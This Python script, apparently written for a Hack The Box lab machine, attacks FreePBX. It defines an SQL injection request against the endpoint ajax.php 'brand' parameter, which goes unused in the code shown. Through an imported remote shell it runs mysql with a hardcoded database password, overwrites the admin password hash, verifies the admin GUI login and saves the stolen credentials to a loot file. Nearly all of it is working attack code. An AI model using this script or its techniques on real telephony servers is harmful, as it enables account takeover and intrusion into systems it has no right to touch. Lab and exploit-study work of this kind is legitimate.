#!/usr/bin/env python3
"""Set FreePBX admin password via CVE-57819 SQLi and verify login."""
import hashlib
import pathlib
import re

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://connected.htb"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")
USER = "admin"
PASSWORD = "admin123"
SHA1 = hashlib.sha1(PASSWORD.encode()).hexdigest()


def hx(t: str) -> str:
    return "0x" + t.encode().hex()


def main() -> int:
    s = requests.Session()
    s.verify = False

    def sqli(pl: str) -> None:
        s.get(
            f"{BASE}/admin/ajax.php",
            params={
                "module": r"FreePBX\modules\endpoint\ajax",
                "command": "model",
                "template": "x",
                "model": "model",
                "brand": pl,
            },
            timeout=120,
        )

    import sys

    sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
    from enum_privesc import get_shell

    print(f"[*] UPDATE admin password_sha1 -> {SHA1} ({PASSWORD}) via mysql on target")
    cmd, url = get_shell()
    out = cmd(
        f"mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h127.0.0.1 asterisk -e "
        f"\"UPDATE ampusers SET password_sha1='{SHA1}' WHERE username='admin'; "
        f"SELECT username,password_sha1 FROM ampusers WHERE username='admin';\" 2>&1",
        timeout=90,
    )
    print(f"[+] db ({url}):\n{out.strip()}")
    if SHA1 not in out:
        print("[-] hash mismatch in DB")
        return 1

    print("[*] login admin GUI")
    s.get(f"{BASE}/admin/config.php", timeout=120)
    r = s.post(
        f"{BASE}/admin/config.php",
        data={"username": USER, "password": PASSWORD},
        timeout=120,
        allow_redirects=True,
    )
    logged_in = 'name="username"' not in r.text and (
        "logout" in r.text.lower()
        or "administration" in r.text.lower()
        or "FreePBX" in r.text
    )
    if not logged_in and 'name="username"' in r.text:
        print("[-] login failed (still on login form)")
        LOOT.joinpath("admin-login-fail.html").write_text(r.text[:50000])
        return 1

    print("[+] login OK")
    m = re.search(r"<title>([^<]+)</title>", r.text, re.I)
    if m:
        print("[+] title:", m.group(1).strip())

    creds = LOOT / "copy-paste.txt"
    text = creds.read_text() if creds.exists() else ""
    block = f"\n# FreePBX admin (ustawione SQLi)\nadmin GUI user=admin pass={PASSWORD}\nadmin SHA1={SHA1}\n"
    if "admin GUI user=" in text:
        text = re.sub(
            r"\n# FreePBX admin.*?(?=\n#|\Z)",
            block.strip() + "\n",
            text,
            flags=re.S,
        )
    else:
        text += block
    creds.write_text(text)
    pathlib.Path("/home/kali/Desktop/htb/copy-paste.txt").write_text(creds.read_text())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())